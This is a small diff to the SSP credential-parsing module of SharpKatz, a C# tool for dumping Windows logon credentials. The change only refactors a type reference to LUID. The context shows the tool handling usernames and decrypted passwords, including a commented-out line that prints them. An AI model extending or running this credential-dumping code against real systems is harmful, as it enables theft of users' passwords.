@@ -6,6 +6,8 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 
+using static SharpKatz.Win32.Natives;
+
 namespace SharpKatz.Module
 {
     class Ssp
@@ -20,7 +22,7 @@ namespace SharpKatz.Module
             public IntPtr Blink;
             public uint References;
             public uint CredentialReferences;
-            public Natives.LUID LogonId;
+            public LUID LogonId;
             public uint unk0;
             public uint unk1;
             public uint unk2;
@@ -63,7 +65,7 @@ namespace SharpKatz.Module
                 Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                 if (!string.IsNullOrEmpty(username) && username.Length > 1)
                 {
-                    Natives.LUID luid = entry.LogonId;
+                    LUID luid = entry.LogonId;
 
                     Credential.Ssp sspentry = new Credential.Ssp();
                     sspentry.Reference = reference;
